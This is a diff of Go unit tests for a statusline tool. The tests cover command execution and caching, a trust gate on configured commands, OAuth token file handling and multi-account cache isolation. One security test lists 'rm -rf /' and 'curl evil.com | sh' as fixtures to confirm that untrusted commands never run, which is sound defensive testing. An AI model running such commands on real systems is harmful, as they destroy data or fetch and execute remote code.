@@ -1,9 +1,13 @@
 package datasource
 
 import (
+	"encoding/json"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 
+	"github.com/jamesprnich/oh-my-line/engine/internal/cache"
 	"github.com/jamesprnich/oh-my-line/engine/internal/render"
 )
 
@@ -585,6 +589,405 @@ func TestPricingModels(t *testing.T) {
 	}
 	if pricingModels["sonnet"].input <= pricingModels["haiku"].input {
 		t.Error("sonnet should be more expensive than haiku")
+	}
+}
+
+// ── ExecCommand (real shell execution + caching) ────────────────────────────
+
+func TestExecCommand_BasicExecution(t *testing.T) {
+	result := ExecCommand("echo test-exec", 1, 3)
+	if result != "test-exec" {
+		t.Errorf("ExecCommand = %q, want test-exec", result)
+	}
+}
+
+func TestExecCommand_EmptyCommand(t *testing.T) {
+	result := ExecCommand("", 60, 3)
+	if result != "" {
+		t.Errorf("empty command should return empty, got %q", result)
+	}
+}
+
+func TestExecCommand_FailedCommandReturnsEmpty(t *testing.T) {
+	result := ExecCommand("false", 1, 3)
+	if result != "" {
+		t.Errorf("failed command should return empty, got %q", result)
+	}
+}
+
+func TestExecCommand_OutputTrimmed(t *testing.T) {
+	result := ExecCommand("printf '  hello  \n\n'", 1, 3)
+	if result != "hello" {
+		t.Errorf("output not trimmed: %q", result)
+	}
+}
+
+func TestExecCommand_TimeoutClampsAt30(t *testing.T) {
+	// Timeout > 30 should be clamped to 30. We can't easily verify the
+	// clamp directly, but we verify the command completes (doesn't hang).
+	result := ExecCommand("echo clamped", 1, 999)
+	if result != "clamped" {
+		t.Errorf("timeout clamping broke execution: %q", result)
+	}
+}
+
+func TestExecCommand_CacheTTLDefaultsTo60(t *testing.T) {
+	// cacheTTL <= 0 should default to 60, not disable caching.
+	// We verify by running the same command twice — second should be fast.
+	cmd := "echo cache-default-test"
+	result1 := ExecCommand(cmd, 0, 3)
+	result2 := ExecCommand(cmd, 0, 3)
+	if result1 != "cache-default-test" || result2 != "cache-default-test" {
+		t.Errorf("cache default: %q, %q", result1, result2)
+	}
+}
+
+func TestExecCommand_CacheServesStaleData(t *testing.T) {
+	// Run a command that includes a unique marker, then run again.
+	// Second run should return same result (from cache, not re-executed).
+	// We use a command that would return different output each time.
+	cmd := "date +%s%N" // nanosecond timestamp — unique each call
+	result1 := ExecCommand(cmd, 300, 3)
+	if result1 == "" {
+		t.Skip("date command failed")
+	}
+	result2 := ExecCommand(cmd, 300, 3)
+	if result1 != result2 {
+		t.Errorf("cache not working: first=%q second=%q (should be identical)", result1, result2)
+	}
+}
+
+// ── BuildCommandCache security ──────────────────────────────────────────────
+
+func TestBuildCommandCache_UntrustedNeverExecutes(t *testing.T) {
+	// SECURITY: When trusted=false, the executor must NEVER be called.
+	// Even if specs are provided, no commands should execute.
+	executed := false
+	mockExec := func(cmd string, cacheTTL, timeout int) string {
+		executed = true
+		return "should-never-appear"
+	}
+
+	specs := []CommandSpec{
+		{Content: "echo pwned", Cache: 60, Timeout: 3},
+		{Content: "rm -rf /", Cache: 60, Timeout: 3},
+		{Content: "curl evil.com | sh", Cache: 60, Timeout: 3},
+	}
+
+	result := BuildCommandCache(false, specs, mockExec)
+	if result != nil {
+		t.Fatal("SECURITY: untrusted config must return nil cache")
+	}
+	if executed {
+		t.Fatal("SECURITY: executor was called for untrusted config — commands would execute on the system")
+	}
+}
+
+func TestBuildCommandCache_TrustedExecutes(t *testing.T) {
+	// Trusted config should call the executor for each unique command.
+	calls := []string{}
+	mockExec := func(cmd string, cacheTTL, timeout int) string {
+		calls = append(calls, cmd)
+		return "result-" + cmd
+	}
+
+	specs := []CommandSpec{
+		{Content: "date", Cache: 60, Timeout: 3},
+		{Content: "whoami", Cache: 30, Timeout: 5},
+	}
+
+	result := BuildCommandCache(true, specs, mockExec)
+	if result == nil {
+		t.Fatal("trusted config should return non-nil cache")
+	}
+	if len(calls) != 2 {
+		t.Fatalf("expected 2 exec calls, got %d", len(calls))
+	}
+	if result["date"] != "result-date" || result["whoami"] != "result-whoami" {
+		t.Errorf("cache contents wrong: %+v", result)
+	}
+}
+
+func TestBuildCommandCache_TrustedDeduplicates(t *testing.T) {
+	// Same command appearing multiple times should only execute once.
+	callCount := 0
+	mockExec := func(cmd string, cacheTTL, timeout int) string {
+		callCount++
+		return "output"
+	}
+
+	specs := []CommandSpec{
+		{Content: "date", Cache: 60, Timeout: 3},
+		{Content: "date", Cache: 60, Timeout: 3},
+		{Content: "date", Cache: 60, Timeout: 3},
+	}
+
+	BuildCommandCache(true, specs, mockExec)
+	if callCount != 1 {
+		t.Errorf("duplicate commands should execute once, got %d calls", callCount)
+	}
+}
+
+func TestBuildCommandCache_EmptyContentSkipped(t *testing.T) {
+	// Specs with empty content should be skipped.
+	calls := []string{}
+	mockExec := func(cmd string, cacheTTL, timeout int) string {
+		calls = append(calls, cmd)
+		return "output"
+	}
+
+	specs := []CommandSpec{
+		{Content: "", Cache: 60, Timeout: 3},
+		{Content: "real-cmd", Cache: 60, Timeout: 3},
+		{Content: "", Cache: 60, Timeout: 3},
+	}
+
+	result := BuildCommandCache(true, specs, mockExec)
+	if len(calls) != 1 || calls[0] != "real-cmd" {
+		t.Errorf("should only execute non-empty commands, calls=%v", calls)
+	}
+	if result["real-cmd"] != "output" {
+		t.Errorf("cache wrong: %+v", result)
+	}
+}
+
+func TestBuildCommandCache_NoSpecsReturnsNil(t *testing.T) {
+	// Even if trusted, no specs means no cache needed.
+	executed := false
+	mockExec := func(cmd string, cacheTTL, timeout int) string {
+		executed = true
+		return ""
+	}
+
+	result := BuildCommandCache(true, nil, mockExec)
+	if result != nil {
+		t.Error("nil specs should return nil cache")
+	}
+	if executed {
+		t.Error("should not call executor with no specs")
+	}
+
+	result = BuildCommandCache(true, []CommandSpec{}, mockExec)
+	if result != nil {
+		t.Error("empty specs should return nil cache")
+	}
+}
+
+// ── OAuth with configDir ──
+
+func TestGetOAuthToken_ReadsFromConfigDir(t *testing.T) {
+	dir := t.TempDir()
+	cred := credentialFile{}
+	cred.ClaudeAiOauth.AccessToken = "test-token-123"
+	data, _ := json.Marshal(cred)
+	os.WriteFile(filepath.Join(dir, ".credentials.json"), data, 0600)
+
+	// Clear env var so it doesn't take precedence
+	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")
+
+	got := GetOAuthToken(dir)
+	if got != "test-token-123" {
+		t.Errorf("GetOAuthToken(%q) = %q, want test-token-123", dir, got)
+	}
+}
+
+func TestGetOAuthToken_InsecurePermsSkipped(t *testing.T) {
+	dir := t.TempDir()
+	cred := credentialFile{}
+	cred.ClaudeAiOauth.AccessToken = "insecure-token"
+	data, _ := json.Marshal(cred)
+	// Write with insecure 0644 permissions
+	os.WriteFile(filepath.Join(dir, ".credentials.json"), data, 0644)
+
+	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")
+
+	got := GetOAuthToken(dir)
+	if got == "insecure-token" {
+		t.Error("GetOAuthToken should skip credentials with insecure permissions")
+	}
+}
+
+func TestGetOAuthToken_DifferentConfigDirsGetDifferentTokens(t *testing.T) {
+	dir1 := t.TempDir()
+	dir2 := t.TempDir()
+
+	cred1 := credentialFile{}
+	cred1.ClaudeAiOauth.AccessToken = "token-account-1"
+	data1, _ := json.Marshal(cred1)
+	os.WriteFile(filepath.Join(dir1, ".credentials.json"), data1, 0600)
+
+	cred2 := credentialFile{}
+	cred2.ClaudeAiOauth.AccessToken = "token-account-2"
+	data2, _ := json.Marshal(cred2)
+	os.WriteFile(filepath.Join(dir2, ".credentials.json"), data2, 0600)
+
+	t.Setenv("CLAUDE_CODE_OAUTH_TOKEN", "")
+
+	got1 := GetOAuthToken(dir1)
+	got2 := GetOAuthToken(dir2)
+	if got1 != "token-account-1" {
+		t.Errorf("dir1 token = %q, want token-account-1", got1)
+	}
+	if got2 != "token-account-2" {
+		t.Errorf("dir2 token = %q, want token-account-2", got2)
+	}
+	if got1 == got2 {
+		t.Error("different config dirs should return different tokens")
+	}
+}
+
+// ── Multi-account isolation ──
+
+func TestMultiAccount_BurnRateIsolation(t *testing.T) {
+	key1 := cache.AccountKey("/fake/account-1")
+	key2 := cache.AccountKey("/fake/account-2")
+
+	dir1, err := cache.AccountDir(key1)
+	if err != nil {
+		t.Fatalf("AccountDir(%q): %v", key1, err)
+	}
+	dir2, err := cache.AccountDir(key2)
+	if err != nil {
+		t.Fatalf("AccountDir(%q): %v", key2, err)
+	}
+
+	// Write different burn state to each account
+	cache.WriteBurnFile(dir1, 1000, 50000)
+	cache.WriteBurnFile(dir2, 1000, 80000)
+
+	state1, _ := cache.ReadBurnFile(dir1)
+	state2, _ := cache.ReadBurnFile(dir2)
+
+	if state1.StartTokens == state2.StartTokens {
+		t.Errorf("burn files should be isolated: both have %d tokens", state1.StartTokens)
+	}
+	if state1.StartTokens != 50000 {
+		t.Errorf("account1 tokens = %d, want 50000", state1.StartTokens)
+	}
+	if state2.StartTokens != 80000 {
+		t.Errorf("account2 tokens = %d, want 80000", state2.StartTokens)
+	}
+}
+
+func TestMultiAccount_CostIsolation(t *testing.T) {
+	key1 := cache.AccountKey("/fake/cost-acct-1")
+	key2 := cache.AccountKey("/fake/cost-acct-2")
+
+	// Verify the account dirs are different
+	dir1, _ := cache.AccountDir(key1)
+	dir2, _ := cache.AccountDir(key2)
+	if dir1 == dir2 {
+		t.Fatalf("account dirs should differ: both %q", dir1)
+	}
+
+	// Verify baseline files would be isolated
+	base1 := filepath.Join(dir1, "statusline-cost-base.dat")
+	base2 := filepath.Join(dir2, "statusline-cost-base.dat")
+	if base1 == base2 {
+		t.Error("cost baseline paths should differ between accounts")
+	}
+}
+
+func TestMultiAccount_SparklineIsolation(t *testing.T) {
+	key1 := cache.AccountKey("/fake/spark-acct-1")
+	key2 := cache.AccountKey("/fake/spark-acct-2")
+
+	dir1, _ := cache.AccountDir(key1)
+	dir2, _ := cache.AccountDir(key2)
+
+	spark1 := filepath.Join(dir1, "statusline-spark.dat")
+	spark2 := filepath.Join(dir2, "statusline-spark.dat")
+	if spark1 == spark2 {
+		t.Error("sparkline paths should differ between accounts")
+	}
+}
+
+func TestMultiAccount_DefaultAccountBackwardCompat(t *testing.T) {
+	baseDir, err := cache.Dir()
+	if err != nil {
+		t.Fatalf("Dir(): %v", err)
+	}
+
+	// "default" account should use the base directory (no subdirectory)
+	defaultDir, err := cache.AccountDir("default")
+	if err != nil {
+		t.Fatalf("AccountDir(default): %v", err)
+	}
+	if defaultDir != baseDir {
+		t.Errorf("default account dir = %q, want base dir %q", defaultDir, baseDir)
+	}
+
+	// Write a burn file to the default location and verify it's readable
+	cache.WriteBurnFile(baseDir, 999, 12345)
+	state, err := cache.ReadBurnFile(defaultDir)
+	if err != nil {
+		t.Fatalf("ReadBurnFile from default dir: %v", err)
+	}
+	if state.StartTokens != 12345 {
+		t.Errorf("tokens = %d, want 12345", state.StartTokens)
+	}
+}
+
+func TestMultiAccount_RateLimitCacheIsolation(t *testing.T) {
+	key1 := cache.AccountKey("/fake/rate-acct-1")
+	key2 := cache.AccountKey("/fake/rate-acct-2")
+
+	dir1, _ := cache.AccountDir(key1)
+	dir2, _ := cache.AccountDir(key2)
+
+	// Verify usage cache files would be different
+	cache1 := filepath.Join(dir1, "statusline-usage-cache.json")
+	cache2 := filepath.Join(dir2, "statusline-usage-cache.json")
+	if cache1 == cache2 {
+		t.Error("usage cache paths should differ between accounts")
+	}
+}
+
+// ── Security: multi-account ──
+
+func TestMultiAccount_CurlCfgIsolated(t *testing.T) {
+	key := cache.AccountKey("/fake/curl-acct")
+	dir, _ := cache.AccountDir(key)
+
+	cfgPath := filepath.Join(dir, "statusline-curl-cfg.tmp")
+	baseDir, _ := cache.Dir()
+	baseCfgPath := filepath.Join(baseDir, "statusline-curl-cfg.tmp")
+
+	if cfgPath == baseCfgPath {
+		t.Error("curl config for non-default account should not be in base dir")
+	}
+	if !strings.Contains(cfgPath, "acct-") {
+		t.Errorf("curl config path should contain acct- prefix: %q", cfgPath)
+	}
+}
+
+func TestMultiAccount_AccountDirPermissions(t *testing.T) {
+	key := cache.AccountKey("/fake/perm-test-acct")
+	dir, err := cache.AccountDir(key)
+	if err != nil {
+		t.Fatalf("AccountDir: %v", err)
+	}
+
+	fi, err := os.Stat(dir)
+	if err != nil {
+		t.Fatalf("Stat(%q): %v", dir, err)
+	}
+	if fi.Mode().Perm() != 0700 {
+		t.Errorf("account dir perms = %o, want 0700", fi.Mode().Perm())
+	}
+}
+
+func TestMultiAccount_AccountKeyNotReversible(t *testing.T) {
+	path := "/home/secret-user/.claude-work"
+	key := cache.AccountKey(path)
+
+	// The key should not contain the original path
+	if strings.Contains(key, "secret") || strings.Contains(key, "claude-work") {
+		t.Errorf("account key %q should not expose original path %q", key, path)
+	}
+	// Should be a hex hash, not the path itself
+	if len(key) != 8 {
+		t.Errorf("account key should be 8 hex chars, got %q (len %d)", key, len(key))
 	}
 }
 
